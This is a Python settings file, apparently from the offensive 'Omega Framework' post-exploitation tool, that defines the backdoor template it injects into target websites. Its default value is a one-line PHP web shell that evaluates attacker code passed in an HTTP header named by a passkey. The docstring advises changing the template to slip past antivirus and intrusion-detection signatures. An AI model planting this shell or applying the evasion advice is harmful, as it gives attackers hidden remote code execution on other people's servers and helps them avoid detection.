#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Omega Framework                                
#            ---------------------------------------------------
#                  Copyright (C) <2020>  <Entynetproject>       
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

"""
This setting allows overriding default backdoor template.
It is used to generate the backdoor to be injected in TARGET url.

This setting can be changed to improve stealth. Using a different
template than the default one is a good was to bypass static
Antivirus/IDS signatures.

Make sure that the global behavior remains the same.
Indeed, BACKDOOR must evaluate the content of 'HTTP_%%PASSKEY%%'
header to work properly.

NOTE: %%PASSKEY%% is a magic string that is replaced by PASSKEY
      value at runtime.

* Only edit BACKDOOR if you really understand what you're doing
"""
import linebuf
import datatypes


linebuf_type = linebuf.RandLineBuffer


def validator(value):
    if value.find("%%PASSKEY%%") < 0:
        raise ValueError("shall contain %%PASSKEY%% string")
    return datatypes.PhpCode(value)


def default_value():
    return("@eval($_SERVER['HTTP_%%PASSKEY%%']);")
